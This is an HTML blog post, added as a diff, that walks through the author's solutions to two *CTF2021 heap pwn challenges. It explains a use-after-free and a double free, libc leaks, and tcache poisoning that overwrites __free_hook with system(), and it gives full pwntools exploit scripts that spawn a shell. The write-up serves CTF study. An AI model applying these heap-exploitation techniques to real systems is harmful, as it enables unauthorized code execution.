@@ -1,0 +1,775 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="arttnba3" />
+  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
+  
+  
+  <title>
+    
+      【CTF.0X02】*CTF2021-Pwn WP 
+      
+      
+      |
+    
+     arttnba3&#39;s blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">【CTF.0X02】*CTF2021-Pwn WP</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-01-20 02:33:00
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/Pwn/" title="Pwn">
+                    <b>#</b> Pwn
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
+                    <b>#</b> 信息安全
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E2%AD%90CTF/" title="⭐CTF">
+                    <b>#</b> ⭐CTF
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%A0%86/" title="堆">
+                    <b>#</b> 堆
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/CTF/" title="CTF">
+                    <b>#</b> CTF
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/tcache-poisoning/" title="tcache poisoning">
+                    <b>#</b> tcache poisoning
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/double-free/" title="double free">
+                    <b>#</b> double free
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Use-After-Free/" title="Use After Free">
+                    <b>#</b> Use After Free
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>C++pwn很好玩，孩子很高兴（因为🧠已经逆炸了）</p>
+<span id="more"></span>
+
+<h1 id="0x00-绪论"><a href="#0x00-绪论" class="headerlink" title="0x00.绪论"></a>0x00.绪论</h1><p>质量挺高的比赛，可惜我比较菜 Or2…</p>
+<p>比赛的时候在我起床之前巨犇队友已经把前面的简单题都出了（膜一膜🐧yyds），后面的题我都没做出来（因为我太菜了QAQ），因此下面的wp基本上都是本地复盘XD</p>
+<h1 id="0x01-babyheap-Use-After-Free-tcache-poisoning"><a href="#0x01-babyheap-Use-After-Free-tcache-poisoning" class="headerlink" title="0x01.babyheap - Use After Free + tcache poisoning"></a>0x01.babyheap - Use After Free + tcache poisoning</h1><blockquote>
+<p> 比较白给的签到题</p>
+</blockquote>
+<p><a href="/download/starCTF2021/pwn/babyheap.zip" title="点击此处下载原题">点击下载-babyheap.zip</a></p>
+<p>惯例的checksec，保护全开</p>
+<p><img src="https://i.loli.net/2021/01/20/dNUGu8zEfwtoyn1.png" alt="AXQ_ZFH21P_~~AUA84UQH7H.png"></p>
+<p>拖入IDA进行分析</p>
+<p><img src="https://i.loli.net/2021/01/20/Y5btDgrNvsm8j1T.png" alt="V6__6F0BSJGIF__91WSD_CY.png"></p>
+<p><del>一  览  无  余</del>（<del>不像后面那个符号表扣光的C++ pwn babygame人都给看傻了</del></p>
+<p>程序本身有着<strong>分配、删除、修改、打印堆块内容</strong>的功能，<del>给的面面俱到，十分白给</del></p>
+<p>漏洞点在于<code>delete()</code>函数中free后没有将指针置NULL，<strong>存在 Use After Free漏洞</strong></p>
+<p><img src="https://i.loli.net/2021/01/20/ZEwbcnI3X7J2Y8R.png"></p>
+<p>在<code>add()</code>函数中我们有着16个可用的下标，且分配时会直接覆写原指针，因此我们几乎是可以分配任意个chunk，但是<strong>只允许我们分配fastbin size范围的chunk</strong></p>
+<p><img src="https://i.loli.net/2021/01/20/UEeKDiZ3hlbXBn9.png" alt="UAB1IY_NM_5GP_K2Y_4TL4V.png"></p>
+<p>因此若想要泄露libc地址我们需要借助<code>malloc_consolidate()</code>将chunk送入small bins中</p>
+<p>注意到<code>leaveYourName()</code>函数中会调用malloc()分配一个大chunk，因此我们可以通过调用该函数触发<code>malloc_consolidate()</code>，将fastbin中chunk送入smallbin， 以泄露libc基址</p>
+<p><img src="https://i.loli.net/2021/01/20/rH6nglJkI9Ne4WO.png" alt="~D9_XAV_4G5_FGKSMTED_13.png"></p>
+<p>gdb调试我们可以得知该地址与main_arena间距336，因而我们便可以得到libc基址</p>
+<p><img src="https://i.loli.net/2021/01/20/CfJBNzhRyul5jAm.png"></p>
+<p><strong>将这个small bin再分配回来我们就能够实现chunk overlapping了，继而就是通过程序的edit功能实现tcache poisoning修改__free_hook为system()后free一个内容为”&#x2F;bin&#x2F;sh”的chunk即可get shell</strong></p>
+<p>需要注意的是<code>edit()</code>函数中是<strong>从bk的位置开始输入</strong>的，因而我们的fake chunk需要构造到<code>__free_hook - 8 </code>的位置</p>
+<p><img src="https://i.loli.net/2021/01/20/uBnYrSZptINMikh.png" alt="image.png"></p>
+<p>故构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8081)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>) <span class="comment"># libc = ELF(&#x27;./libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index:<span class="built_in">int</span>, size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input size&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input content&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;input index&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leaveYourName</span>(<span class="params">content</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk 15 to prevent consolidate forward, so that we can get a smallbin chunk</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># malloc_consolidate() to get a smallbin chunk, leak libc addr</span></span><br><span class="line">    leaveYourName(<span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    dump(<span class="number">7</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">336</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&quot;Libc addr:&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#tcache poisoning</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        new(i, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">7</span>, <span class="number">0x60</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>))</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite __free_hook</span></span><br><span class="line">    new(<span class="number">10</span>, <span class="number">0x10</span>)</span><br><span class="line">    new(<span class="number">9</span>, <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">9</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    edit(<span class="number">7</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x21</span>) + <span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<p>运行即可get shell</p>
+<p><img src="https://i.loli.net/2021/01/20/NFqcz781vACTKPB.png"></p>
+<h1 id="0x02-babygame-double-free-tcache-poisoning"><a href="#0x02-babygame-double-free-tcache-poisoning" class="headerlink" title="0x02.babygame - double free + tcache poisoning"></a>0x02.babygame - double free + tcache poisoning</h1><blockquote>
+<p>设计很巧妙的一道题，以及我差不多是硬调出来的（</p>
+</blockquote>
+<p><a href="/download/starCTF2021/pwn/babygame.zip" title="点击此处下载原题">点击下载-babygame.zip</a></p>
+<p>惯例的checksec，保护全开</p>
+<p><img src="https://i.loli.net/2021/01/20/y7LnNfmzYWPuc9G.png" alt="image.png"></p>
+<p>运行一下，大概可以知道这是一个推箱子小游戏</p>
+<p><img src="https://i.loli.net/2021/01/22/7NYPhxkrXisWUqB.png"></p>
+<p>拖入IDA进行分析，<del>符号表被扣光，分析出一坨shit</del></p>
+<blockquote>
+<p>部分函数、变量名经重命名</p>
+</blockquote>
+<p>在一开始时会分配一个大小为0x500的chunk，<strong>超出了tcache的范围</strong>，在<strong>free时会被直接放入Unsorted Bin中</strong></p>
+<p><img src="https://i.loli.net/2021/01/22/6i8zvdhmw31ekBn.png" alt="image.png"></p>
+<p>在尝试退出时可以输入一个字符串，最后会free掉这个0x500的大chunk，但是后面我们又可以重新将这个chunk申请回来（通过程序的restart功能），<strong>这个时候就会在chunk上残留指向main_arena + 96的指针</strong></p>
+<p><img src="https://i.loli.net/2021/01/22/gXxwGDlWqTkPVLK.png" alt="image.png"></p>
+<p>同时，题目中有着打印该chunk的功能，通过free后重新malloc的方式<strong>我们便可以获得libc的基址</strong></p>
+<p><img src="https://i.loli.net/2021/01/22/6W2lrHsLmZ7hRvE.png" alt="image.png"></p>
+<p>题目的漏洞点在于当你<strong>成功通过一关后再选择下一关之后选择退出便会导致double free</strong></p>
+<p><img src="https://i.loli.net/2021/01/22/AR2OPinM8D5Kaeu.png"></p>
+<p>gdb调试，我们将断点下在<code>malloc_printerr()</code>函数处，其上层调用函数为<code>_int_free(mstate av, mchunkptr p, int have_lock)</code>，那么我们<strong>便可以从rsi寄存器处获取到被double free的chunk的地址</strong></p>
+<p><img src="https://i.loli.net/2021/01/23/XtUISQ2ckoZgbsz.png"></p>
+<p>其size为<code>0x61</code></p>
+<p><img src="https://i.loli.net/2021/01/23/D2uwcevXVQsqJih.png"></p>
+<p><del>经历了在IDA中苦苦哀嚎无数小时后</del>进行动态调式时观察到对于程序的leave your name功能其会根据输入的长度分配相应大小的堆块</p>
+<p><img src="https://i.loli.net/2021/01/23/6RWdGglwUM8ntLO.png"></p>
+<p><img src="https://i.loli.net/2021/01/23/DdY3TGBJjmfSkVP.png"></p>
+<p>同时观察到<strong>该类型堆块不会被释放，而是会每次输入都申请一次</strong></p>
+<p><img src="https://i.loli.net/2021/01/23/Hnj1BqmPCirKRLk.png"></p>
+<p><img src="https://i.loli.net/2021/01/23/wSIONf7Epij3lCq.png"></p>
+<p>那么我们便可以<strong>利用程序的leave your name功能申请任意次数的任意大小的堆块</strong></p>
+<p>同时<strong>题目所给的libc为可以进行tcache double free的2.27版本</strong></p>
+<p><img src="https://i.loli.net/2021/01/22/YpaDTSGX2mLBzvQ.png"></p>
+<p>同时<strong>在message功能中我们是可以往0x500的大chunk中写入内容的，而在程序退出时该chunk会被释放</strong></p>
+<p><img src="https://i.loli.net/2021/01/23/Ga3ehQvfPrDdLpJ.png"></p>
+<p>那么我们便考虑<strong>先泄露libc地址后通过double free构造tcache poisoning进行任意地址写改写__free_hook为system函数后通过message功能创建内容为”&#x2F;bin&#x2F;sh”的堆块后退出使得该堆块被释放即可get shell</strong></p>
+<p>最后构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc.so.6&#x27;</span>&#125;) <span class="comment"># p = remote(&#x27;52.152.231.198&#x27;, 8082)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">double_free</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;s&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;w&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;d&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;your name:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>():</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;restart?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;l&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;message:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    leak()</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">96</span></span><br><span class="line">    __malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = __malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    double_free()</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)) <span class="comment"># a redundante chunk tested out</span></span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(<span class="string">b&#x27;&#x27;</span>.ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    new(p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]).ljust(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an level from 1-9:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;m&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input an order:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;q&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;leave your name?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+
+<p>运行即可get shell</p>
+<p><img src="https://i.loli.net/2021/01/22/hOBAxz4YWRQoaf2.png"></p>
+<blockquote>
+<p>我本来想通过string类的创建和释放来get shell的，但是没能成功…希望有师傅能告知原因Or2</p>
+</blockquote>
+<blockquote>
+<p>附：一张未完成的对于题目文件中a1的分析图：<del>画到一半实在是分析不下去了</del></p>
+<p><img src="https://i.loli.net/2021/01/22/re2Edkg3ROQJYoG.png" alt="image.png"></p>
+<p>以及题目中有着大量的这样不知所谓的混淆函数…有机会一定要去暴捶出题人（x</p>
+<p><img src="https://i.loli.net/2021/01/22/Jl9NXrpozegvfUy.png" alt="image.png"></p>
+</blockquote>
